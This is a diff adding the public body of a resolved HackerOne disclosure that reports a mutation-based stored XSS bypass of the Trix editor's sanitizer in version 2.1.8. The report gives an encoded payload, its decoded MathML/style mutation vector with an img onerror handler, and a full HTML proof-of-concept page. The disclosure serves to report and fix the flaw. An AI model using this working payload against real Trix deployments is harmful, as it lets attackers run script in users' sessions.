@@ -7,6 +7,7 @@ tags:
 substate: "resolved"
 weakness: null
 enriched: true
+body: true
 date: 2025-06-27
 submitted: 2024-11-04T14:09:01.019Z
 bounty_usd: null
@@ -24,6 +25,59 @@ title: "Mutation Based Stored XSS on Trix Editor version latest (2.1.8)"
 - Report: [https://hackerone.com/reports/2819573](https://hackerone.com/reports/2819573)
 - CWE: N/A
 - Submitted: 2024-11-04T14:09:01.019Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Heyy there,
+I have found a bypass for the sanitizer used in Trix Editor https://github.com/basecamp/trix , the bypass is kind a  of mutation based , using copy paste vector it's possible to perform the xss.
+
+An example payload would be:
+
+```html
+copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSS POC&quot;}"></div>me
+```
+
+Decoding the html entity you get the below payload ,which contains the mutation xss vector
+```html
+<math><mtext><table><mglyph><style><img src=x onerror=alert()></style>
+```
+
+For more details on this bypass you can read here: https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
+There will exist will more simple vectors this is just an example which worked out of the blue.
+
+-------------------------------------------------
+
+**Steps to reproduce:**
+
+Using the similar poc from the report #2521419 we can replicate the bug, just save the below code in .html file and then copy the text saying `copy me` and paste it in the editor this will popup an alert.
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Trix Editor XSS Demo</title>
+  <script src="https://cdn.jsdelivr.net/npm/trix@2.1.8/dist/trix.umd.js"></script>
+  <link href="https://cdn.jsdelivr.net/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
+</head>
+<body>
+  <h1>Trix Editor XSS Demo</h1>
+  <trix-editor></trix-editor>
+  <script>
+  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSS POC&quot;}"></div>me`);
+  </script>
+</body>
+</html>
+
+```
+
+{F3733124}
+
+## Impact
+
+An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.
 
 ## Timeline
 
